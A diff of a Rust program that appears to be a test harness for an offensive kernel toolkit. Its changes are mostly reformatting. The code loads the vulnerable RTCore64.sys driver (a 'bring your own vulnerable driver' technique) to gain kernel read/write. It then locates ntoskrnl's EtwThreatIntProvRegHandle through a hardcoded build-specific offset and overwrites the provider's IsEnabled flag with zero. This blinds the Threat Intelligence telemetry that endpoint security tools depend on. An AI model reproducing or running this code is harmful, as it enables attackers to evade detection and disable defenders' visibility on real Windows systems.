@@ -21,25 +21,51 @@ use nyx_operator_kernelsdk::KernelRw;
 
 // 与 bootstrap_test 一致：驱动放 system32\drivers，相对 ImagePath。
 const SYS_PATH: &[u16] = &[
-    'S' as u16, 'y' as u16, 's' as u16, 't' as u16, 'e' as u16, 'm' as u16,
-    '3' as u16, '2' as u16, '\\' as u16,
-    'd' as u16, 'r' as u16, 'i' as u16, 'v' as u16, 'e' as u16, 'r' as u16,
-    's' as u16, '\\' as u16,
-    'R' as u16, 'T' as u16, 'C' as u16, 'o' as u16, 'r' as u16, 'e' as u16,
-    '6' as u16, '4' as u16, '.' as u16, 's' as u16, 'y' as u16, 's' as u16,
+    'S' as u16,
+    'y' as u16,
+    's' as u16,
+    't' as u16,
+    'e' as u16,
+    'm' as u16,
+    '3' as u16,
+    '2' as u16,
+    '\\' as u16,
+    'd' as u16,
+    'r' as u16,
+    'i' as u16,
+    'v' as u16,
+    'e' as u16,
+    'r' as u16,
+    's' as u16,
+    '\\' as u16,
+    'R' as u16,
+    'T' as u16,
+    'C' as u16,
+    'o' as u16,
+    'r' as u16,
+    'e' as u16,
+    '6' as u16,
+    '4' as u16,
+    '.' as u16,
+    's' as u16,
+    'y' as u16,
+    's' as u16,
     0,
 ];
 const SVC_NAME: &[u16] = &[
-    'R' as u16, 'T' as u16, 'C' as u16, 'o' as u16, 'r' as u16, 'e' as u16,
-    '6' as u16, '4' as u16,
+    'R' as u16, 'T' as u16, 'C' as u16, 'o' as u16, 'r' as u16, 'e' as u16, '6' as u16, '4' as u16,
 ];
 
 /// ntoskrnl!EtwThreatIntProvRegHandle RVA (build 17763.1339, PDB-resolved).
 const ETW_TI_HANDLE_RVA: u32 = 0x40A6B0;
 
 extern "system" {
-    fn RtlAdjustPrivilege(privilege: u32, enable: i32, current_thread: i32,
-                          enabled: *mut i32) -> i32;
+    fn RtlAdjustPrivilege(
+        privilege: u32,
+        enable: i32,
+        current_thread: i32,
+        enabled: *mut i32,
+    ) -> i32;
 }
 
 fn enable_privileges() {
@@ -59,32 +85,46 @@ fn main() {
     let (mut loaded, krw) = unsafe {
         match bootstrap_byovd(SYS_PATH, SVC_NAME) {
             Ok(t) => t,
-            Err(e) => { eprintln!("[FAIL] bootstrap: {}", e); std::process::exit(1); }
+            Err(e) => {
+                eprintln!("[FAIL] bootstrap: {}", e);
+                std::process::exit(1);
+            }
         }
     };
 
     // ---- ntoskrnl base + handle KVA ----
     let base = unsafe { kernel_base::ntoskrnl_base() }.unwrap_or_else(|e| {
-        eprintln!("[FAIL] ntoskrnl_base: {}", e); loaded.unload(); std::process::exit(2);
+        eprintln!("[FAIL] ntoskrnl_base: {}", e);
+        loaded.unload();
+        std::process::exit(2);
     });
     let handle_kva = base + ETW_TI_HANDLE_RVA as usize;
-    println!("[I.2] ntoskrnl base=0x{:016x} | EtwThreatIntProvRegHandle KVA=0x{:016x}",
-             base, handle_kva);
+    println!(
+        "[I.2] ntoskrnl base=0x{:016x} | EtwThreatIntProvRegHandle KVA=0x{:016x}",
+        base, handle_kva
+    );
 
     let offsets = EtwTiOffsets::for_build(17763).unwrap();
-    let kit = EtwTiBlind { prov_reg_handle_kva: handle_kva, offsets };
+    let kit = EtwTiBlind {
+        prov_reg_handle_kva: handle_kva,
+        offsets,
+    };
 
     // ---- 红线：blind 前先读 IsEnabled，确认 provider 当前 enabled ----
     println!("[I.3] pre-blind is_blinded() check (kread IsEnabled) ...");
     let was_blinded = match kit.is_blinded(&krw) {
         Ok(b) => b,
-        Err(e) => { eprintln!("[FAIL] pre-blind is_blinded: {}", e);
-                    loaded.unload(); std::process::exit(3); }
+        Err(e) => {
+            eprintln!("[FAIL] pre-blind is_blinded: {}", e);
+            loaded.unload();
+            std::process::exit(3);
+        }
     };
     // 直接读 IsEnabled 原值（用于诊断，显示真实字节）
     if let Ok(guid_entry) = krw.kread_u64(handle_kva) {
         if guid_entry != 0 {
-            let prov = krw.kread_u64(guid_entry as usize + offsets.guid_entry_to_provider_block)
+            let prov = krw
+                .kread_u64(guid_entry as usize + offsets.guid_entry_to_provider_block)
                 .unwrap_or(0) as usize;
             if prov != 0 {
                 let ie_kva = prov + offsets.provider_block_to_enable_info;
@@ -94,7 +134,10 @@ fn main() {
             }
         }
     }
-    println!("[I.3] is_blinded(pre) = {} (false = provider ENABLED)", was_blinded);
+    println!(
+        "[I.3] is_blinded(pre) = {} (false = provider ENABLED)",
+        was_blinded
+    );
 
     // ---- blind：写 IsEnabled = 0 ----
     println!("[I.4] EtwTiBlind::blind() — writing IsEnabled=0 ...");
@@ -113,17 +156,25 @@ fn main() {
             loaded.unload();
             std::process::exit(5);
         }
-        Err(e) => { eprintln!("[FAIL] post is_blinded: {}", e); loaded.unload(); std::process::exit(6); }
+        Err(e) => {
+            eprintln!("[FAIL] post is_blinded: {}", e);
+            loaded.unload();
+            std::process::exit(6);
+        }
     }
     // 再读一次 raw IsEnabled 确认写成了 0。
     if let Ok(guid_entry) = krw.kread_u64(handle_kva) {
         if guid_entry != 0 {
-            let prov = krw.kread_u64(guid_entry as usize + offsets.guid_entry_to_provider_block)
+            let prov = krw
+                .kread_u64(guid_entry as usize + offsets.guid_entry_to_provider_block)
                 .unwrap_or(0) as usize;
             if prov != 0 {
                 let ie_kva = prov + offsets.provider_block_to_enable_info;
                 if let Ok(v) = krw.kread_u64(ie_kva) {
-                    println!("       IsEnabled raw @0x{:016x} = 0x{:016x} (post-blind)", ie_kva, v);
+                    println!(
+                        "       IsEnabled raw @0x{:016x} = 0x{:016x} (post-blind)",
+                        ie_kva, v
+                    );
                 }
             }
         }
